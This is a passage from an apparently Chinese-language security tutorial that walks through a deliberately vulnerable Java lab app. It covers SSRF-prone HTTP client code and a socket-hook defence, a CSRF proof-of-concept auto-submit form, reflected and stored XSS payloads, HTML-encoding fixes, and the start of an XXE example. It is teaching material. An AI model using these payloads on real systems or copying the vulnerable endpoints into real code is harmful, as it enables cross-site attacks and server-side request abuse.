class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">httpClient</span><span class="params">(String url)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">CloseableHttpClient</span> <span class="variable">client</span> <span class="operator">=</span> HttpClients.createDefault();</span><br><span class="line">            <span class="type">HttpGet</span> <span class="variable">httpGet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpGet</span>(url);</span><br><span class="line">            <span class="comment">// set redirect enable false</span></span><br><span class="line">            <span class="comment">// httpGet.setConfig(RequestConfig.custom().setRedirectsEnabled(false).build());</span></span><br><span class="line">            <span class="type">HttpResponse</span> <span class="variable">httpResponse</span> <span class="operator">=</span> client.execute(httpGet); <span class="comment">// send request</span></span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">rd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(httpResponse.getEntity().getContent()));</span><br><span class="line"></span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = rd.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                result.append(line);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> result.toString();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>方法3：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/commonsHttpClient/sec&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">commonsHttpClient</span><span class="params">(<span class="meta">@RequestParam</span> String url)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        SecurityUtil.startSSRFHook();</span><br><span class="line">        <span class="keyword">return</span> HttpUtils.commonHttpClient(url);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SSRFException | IOException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> e.getMessage();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        SecurityUtil.stopSSRFHook();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>commonHttpClient</code>函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">commonHttpClient</span><span class="params">(String url)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">HttpClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpClient</span>();</span><br><span class="line">    <span class="type">GetMethod</span> <span class="variable">method</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GetMethod</span>(url);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        client.executeMethod(method); <span class="comment">// send request</span></span><br><span class="line">        <span class="type">byte</span>[] resBody = method.getResponseBody();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(resBody);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error: &quot;</span> + e.getMessage();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// Release the connection.</span></span><br><span class="line">        method.releaseConnection();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>方法4：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;/Jsoup/sec&quot;)</span><br><span class="line">public String Jsoup(@RequestParam String url) &#123;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        SecurityUtil.startSSRFHook();</span><br><span class="line">        return HttpUtils.Jsoup(url);</span><br><span class="line">    &#125; catch (SSRFException | IOException e) &#123;</span><br><span class="line">        return e.getMessage();</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">        SecurityUtil.stopSSRFHook();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Jsoup函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">Jsoup</span><span class="params">(String url)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> Jsoup.connect(url)</span><br><span class="line"><span class="comment">//                    .followRedirects(false)</span></span><br><span class="line">                    .timeout(<span class="number">3000</span>)</span><br><span class="line">                    .cookie(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;joychou&quot;</span>) <span class="comment">// request cookies</span></span><br><span class="line">                    .execute().parse();</span><br><span class="line">            <span class="keyword">return</span> doc.outerHtml();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>方法5：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/IOUtils/sec&quot;)</span></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">IOUtils</span><span class="params">(String url)</span> &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          SecurityUtil.startSSRFHook();</span><br><span class="line">          HttpUtils.IOUtils(url);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (SSRFException | IOException e) &#123;</span><br><span class="line">          <span class="keyword">return</span> e.getMessage();</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">          SecurityUtil.stopSSRFHook();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;IOUtils ssrf test&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>IOUtils</code>函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">IOUtils</span><span class="params">(String url)</span> &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          IOUtils.toByteArray(URI.create(url));</span><br><span class="line">      &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">          logger.error(e.getMessage());</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><table><thead><tr><th>特性&#x2F;框架</th><th><strong>OkHttp</strong></th><th><strong>Apache HttpClient 4.x</strong></th><th><strong>Commons HttpClient 3.x</strong></th><th><strong>Jsoup</strong></th><th><strong>IOUtils + URLConnection</strong></th></tr></thead><tbody><tr><td><strong>主要定位</strong></td><td>现代高性能 HTTP 客户端</td><td>企业常用 HTTP 客户端</td><td>老版本 HTTP 客户端（已废弃）</td><td>网页抓取 + HTML 解析</td><td>简单流读取工具</td></tr><tr><td><strong>支持协议</strong></td><td>HTTP&#x2F;HTTPS（默认拒绝 file:&#x2F;&#x2F;）</td><td>HTTP&#x2F;HTTPS（默认拒绝 file:&#x2F;&#x2F;）</td><td>HTTP&#x2F;HTTPS（部分场景支持 file:&#x2F;&#x2F;）</td><td>HTTP&#x2F;HTTPS&#x2F;FILE</td><td>HTTP&#x2F;HTTPS&#x2F;FILE&#x2F;GOPHER 等</td></tr><tr><td><strong>是否跟随重定向</strong></td><td>✅ 默认跟随，可禁用</td><td>✅ 默认跟随，可禁用</td><td>✅ 默认跟随，可禁用</td><td>✅ 默认跟随</td><td>✅ 默认跟随</td></tr><tr><td><strong>连接池</strong></td><td>✅ 内置复用连接池</td><td>✅ 可配置连接池</td><td>❌ 无</td><td>❌ 无</td><td>❌ 每次新建连接</td></tr><tr><td><strong>超时设置</strong></td><td>✅ 支持连接&#x2F;读超时</td><td>✅ 支持连接&#x2F;读超时</td><td>❌ 配置复杂，易忽略</td><td>✅ 可配置超时</td><td>❌ 默认无限等待</td></tr><tr><td><strong>HTTP&#x2F;2 支持</strong></td><td>✅ 支持</td><td>❌ 不支持（需额外模块）</td><td>❌ 不支持</td><td>❌ 不支持</td><td>❌ 不支持</td></tr><tr><td><strong>API 复杂度</strong></td><td>简单，链式调用</td><td>相对复杂，配置灵活</td><td>老旧 API，繁琐</td><td>最简单</td><td>最原始</td></tr><tr><td><strong>维护情况</strong></td><td>活跃（Square 维护）</td><td>活跃（Apache 维护）</td><td>❌ 已停止维护</td><td>活跃（Jsoup 团队）</td><td>JDK 自带，无新特性</td></tr><tr><td><strong>SSRF 风险</strong></td><td><strong>低</strong>（默认禁止 file:&#x2F;&#x2F;）</td><td><strong>低</strong>（默认禁止 file:&#x2F;&#x2F;）</td><td>中（可能支持 file:&#x2F;&#x2F;）</td><td><strong>高</strong>（默认支持 file:&#x2F;&#x2F;）</td><td><strong>高</strong>（支持 file:&#x2F;&#x2F;、gopher:&#x2F;&#x2F;）</td></tr><tr><td><strong>适用场景</strong></td><td>通用 HTTP 请求、API 调用、移动端</td><td>企业后端、复杂 HTTP 请求</td><td>维护遗留系统</td><td>爬虫、HTML 解析</td><td>小工具快速读取流</td></tr><tr><td><strong>是否推荐新项目使用</strong></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p><strong>总结</strong></p><ul><li><strong>OkHttp</strong> 是一个现代且灵活的 HTTP 客户端，性能好，适用于大多数 HTTP 通信任务。</li><li><strong>HttpClient</strong> 更适合复杂的 HTTP 通信场景，有较强的功能支持，如认证、重定向等，但相对复杂，适合大型项目。</li><li><strong>CommonHttpClient</strong> 已经过时，主要用于老项目的兼容，不推荐在新项目中使用。</li><li><strong>Jsoup</strong> 适合处理 HTML 解析任务和轻量的 HTTP 请求，专注于网页抓取和数据提取。</li><li><strong>IOUtils</strong> 则是一个简化的工具，主要用于读取 URL 内容并转换为字节流，适合简单的小数据传输。</li></ul><p>（4）核心SSRF防护代码</p><p>修复代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public class SocketHook &#123;</span><br><span class="line"></span><br><span class="line">    public static void startHook() throws IOException &#123;</span><br><span class="line">        SocketHookFactory.initSocket();</span><br><span class="line">        SocketHookFactory.setHook(true);</span><br><span class="line">        try&#123;</span><br><span class="line">            Socket.setSocketImplFactory(new SocketHookFactory());</span><br><span class="line">        &#125;catch (SocketException ignored)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void stopHook()&#123;</span><br><span class="line">        SocketHookFactory.setHook(false);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">java复制代码123456789101112131415</span><br></pre></td></tr></table></figure><p><strong>功能分析</strong>：</p><ul><li><p><code>startHook()</code></p><p>:</p><ul><li>启动 <code>SocketHook</code>，对所有新创建的 <code>Socket</code> 应用自定义行为。核心是通过 <code>Socket.setSocketImplFactory()</code> 来设置一个新的 <code>Socket</code> 工厂。</li><li>可能用于在 <code>Socket</code> 连接期间监控、修改、或审查数据流量。</li></ul></li><li><p><code>stopHook()</code></p><p>:</p><ul><li>关闭 <code>SocketHook</code>，将 <code>SocketHookFactory</code> 中的钩子状态关闭，停止对新 <code>Socket</code> 实例的自定义行为。</li></ul></li></ul><p><strong>应用场景</strong>：</p><ul><li><strong>安全防护</strong>：可以用来检测、拦截或修改特定的网络连接，防止攻击（如 SSRF、RFI 等）通过不受控制的网络请求滥用服务器资源。</li><li><strong>网络审计</strong>：可用于监控网络流量，以记录或分析 <code>Socket</code> 通信内容。</li><li><strong>调试&#x2F;测试</strong>：在调试或测试环境中，使用钩子来捕获和分析网络通信行为。</li></ul><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>原理：</p><p>CSRF (Cross-site request forgery，跨站请求伪造)也被称为One Click Attack或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本(XSS)，但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户请求受信任的网站。</p><p>简单的说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己以前认证过的站点并运行一些操作（如发邮件，发消息，甚至财产操作（如转账和购买商品））。因为浏览器之前认证过，所以被访问的站点会觉得这是真正的用户操作而去运行。</p><p><strong>攻击流程：</strong></p><ol><li>用户在浏览器中登录了受信任的网站（如银行网站），并且拥有有效的会话。</li><li>攻击者创建了一个恶意网站，嵌入了向受信任网站发送请求的代码。</li><li>用户在登录受信任网站后，访问了攻击者的恶意网站，恶意网站在用户不知情的情况下，自动向受信任网站发送请求（如转账请求）。</li><li>受信任的网站无法区分该请求是用户发起的还是攻击者伪造的，因此会执行这个请求</li></ol><h4 id="1-csrf-post"><a href="#1-csrf-post" class="headerlink" title="1.&#x2F;csrf&#x2F;post"></a>1.&#x2F;csrf&#x2F;post</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">@Controller</span><br><span class="line">@RequestMapping(&quot;/csrf&quot;)</span><br><span class="line">public class CSRF &#123;</span><br><span class="line"></span><br><span class="line">    @GetMapping(&quot;/&quot;)</span><br><span class="line">    public String index() &#123;</span><br><span class="line">        return &quot;form&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @PostMapping(&quot;/post&quot;)</span><br><span class="line">    @ResponseBody</span><br><span class="line">    public String post() &#123;</span><br><span class="line">        return &quot;CSRF passed.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们来看前端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;html xmlns:th=&quot;http://www.thymeleaf.org&quot; lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;script th:src=&quot;@&#123;https://code.jquery.com/jquery-3.4.1.min.js&#125;&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;!-- th:action with Spring 3.2+ and Thymeleaf 2.1+ can automatically force Thymeleaf to include the CSRF token as a hidden field --&gt;</span><br><span class="line">    &lt;!-- &lt;form name=&quot;f&quot; th:action=&quot;@&#123;/csrf/post&#125;&quot; method=&quot;post&quot;&gt; --&gt;</span><br><span class="line">    &lt;form name=&quot;f&quot; action=&quot;/csrf/post&quot; method=&quot;post&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;input&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; th:name=&quot;$&#123;_csrf.parameterName&#125;&quot; th:value=&quot;$&#123;_csrf.token&#125;&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>该代码存在csrf漏洞，漏洞验证poc：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;CSRF Exploit&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Simulating CSRF Attack&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form id=&quot;csrfForm&quot; action=&quot;http://127.0.0.1:8080/csrf/post&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;message&quot; value=&quot;This is a CSRF attack message&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        // 自动提交表单，执行攻击</span><br><span class="line">        document.getElementById(&#x27;csrfForm&#x27;).submit();</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="csrf的防护"><a href="#csrf的防护" class="headerlink" title="csrf的防护"></a>csrf的防护</h4><ol><li>使用CSRF Token</li></ol><p>在每个表单或请求中，加入一个随机生成的token，并将其与服务器端的token进行对比。这个token通常存储在用户的session中，每次请求时都要携带这个token，防止外部网站伪造请求。</p><ul><li>在HTML表单中加入一个隐藏的input字段来传递CSRF token。</li><li>在服务器端验证请求中的token是否与存储的一致。</li></ul><ol start="2"><li>Referer Header 检查</li></ol><p>检查请求中的<code>Referer</code> header，确保请求来源是合法的站点。尽管这一方法并不完全可靠，因为有些浏览器可能会限制或不发送<code>Referer</code>，但它可以作为额外的安全措施。</p><ol start="3"><li>SameSite Cookie 属性</li></ol><p>使用<code>SameSite</code>属性设置cookies，限制跨站请求时是否可以发送cookie。<code>SameSite</code>有三个值：</p><ul><li><code>Strict</code>：完全禁止跨站请求携带cookie。</li><li><code>Lax</code>：只有部分跨站请求才携带cookie（例如从外部链接访问站点时）。</li><li><code>None</code>：允许跨站请求携带cookie，但必须设置<code>Secure</code>，即请求需要使用HTTPS。</li></ul><ol start="4"><li>HTTP 方法限制</li></ol><p>对于敏感操作，尽量使用<code>POST</code>、<code>PUT</code>、<code>DELETE</code>等非GET方法，因为GET请求一般不带有请求体，容易被CSRF利用。并且可以通过在服务器端验证请求方法是否符合规范来增加安全性。</p><ol start="5"><li>验证码（CAPTCHA）</li></ol><p>在执行重要操作（如提交表单或修改敏感信息）时，加入验证码验证，确保操作是由真实用户执行，而不是自动化脚本。</p><ol start="6"><li>双重身份验证（2FA）</li></ol><p>结合身份验证措施，如短信验证码或应用生成的二次密码，在用户执行敏感操作时进一步确认其身份。</p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><h4 id="1-xss-reflect"><a href="#1-xss-reflect" class="headerlink" title="1.&#x2F;xss&#x2F;reflect"></a>1.&#x2F;xss&#x2F;reflect</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(&quot;/reflect&quot;)</span><br><span class="line">@ResponseBody</span><br><span class="line">public static String reflect(String xss) &#123;</span><br><span class="line">    return xss;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反射型xss</p><p>利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?xss=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251640728.png" alt="image-20250725164023603" loading="lazy"></p><h4 id="2-xss-stored"><a href="#2-xss-stored" class="headerlink" title="2.&#x2F;xss&#x2F;stored"></a>2.&#x2F;xss&#x2F;stored</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(&quot;/stored/store&quot;)</span><br><span class="line">   @ResponseBody</span><br><span class="line">   public String store(String xss, HttpServletResponse response) &#123;</span><br><span class="line">       Cookie cookie = new Cookie(&quot;xss&quot;, xss);</span><br><span class="line">       response.addCookie(cookie);</span><br><span class="line">       return &quot;Set param into cookie&quot;;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   /**</span><br><span class="line">    * Vul Code.</span><br><span class="line">    * StoredXSS Step2</span><br><span class="line">    * http://localhost:8080/xss/stored/show</span><br><span class="line">    *</span><br><span class="line">    * @param xss unescape string</span><br><span class="line">    */</span><br><span class="line">   @RequestMapping(&quot;/stored/show&quot;)</span><br><span class="line">   @ResponseBody</span><br><span class="line">   public String show(@CookieValue(&quot;xss&quot;) String xss) &#123;</span><br><span class="line">       return xss;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>存储型xss，我们先在&#x2F;stored&#x2F;store路由存入Cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?xss=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251643828.png" alt="image-20250725164345723" loading="lazy"></p><p>然后在&#x2F;stored&#x2F;show路由攻击</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251644303.png" alt="image-20250725164425228" loading="lazy"></p><h4 id="xss防护"><a href="#xss防护" class="headerlink" title="xss防护"></a>xss防护</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> /**</span><br><span class="line">     * safe Code.</span><br><span class="line">     * http://localhost:8080/xss/safe</span><br><span class="line">     */</span><br><span class="line">    @RequestMapping(&quot;/safe&quot;)</span><br><span class="line">    @ResponseBody</span><br><span class="line">    public static String safe(String xss) &#123;</span><br><span class="line">        return encode(xss);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static String encode(String origin) &#123;</span><br><span class="line">        origin = StringUtils.replace(origin, &quot;&amp;&quot;, &quot;&amp;amp;&quot;);</span><br><span class="line">        origin = StringUtils.replace(origin, &quot;&lt;&quot;, &quot;&amp;lt;&quot;);</span><br><span class="line">        origin = StringUtils.replace(origin, &quot;&gt;&quot;, &quot;&amp;gt;&quot;);</span><br><span class="line">        origin = StringUtils.replace(origin, &quot;\&quot;&quot;, &quot;&amp;quot;&quot;);</span><br><span class="line">        origin = StringUtils.replace(origin, &quot;&#x27;&quot;, &quot;&amp;#x27;&quot;);</span><br><span class="line">        origin = StringUtils.replace(origin, &quot;/&quot;, &quot;&amp;#x2F;&quot;);</span><br><span class="line">        return origin;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>把需要的字符都过滤了基本就防完了xss攻击</p><h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><h4 id="1-xxe-xmlReader-vuln"><a href="#1-xxe-xmlReader-vuln" class="headerlink" title="1.&#x2F;xxe&#x2F;xmlReader&#x2F;vuln"></a>1.&#x2F;xxe&#x2F;xmlReader&#x2F;vuln</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;/xmlReader/vuln&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">xmlReaderVuln</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> WebUtils.getRequestBody(request);</span><br><span class="line">        logger.info(body);</span><br><span class="line">        <span class="type">XMLReader</span> <span class="variable">xmlReader</span> <span class="operator">=</span> XMLReaderFactory.createXMLReader();</span><br><span class="line">        xmlReader.parse(<span class="keyword">new</span> <span class="title class_">InputSource</span>(<span class="keyword">new</span> <span class="title class_">StringReader</span>(body)));  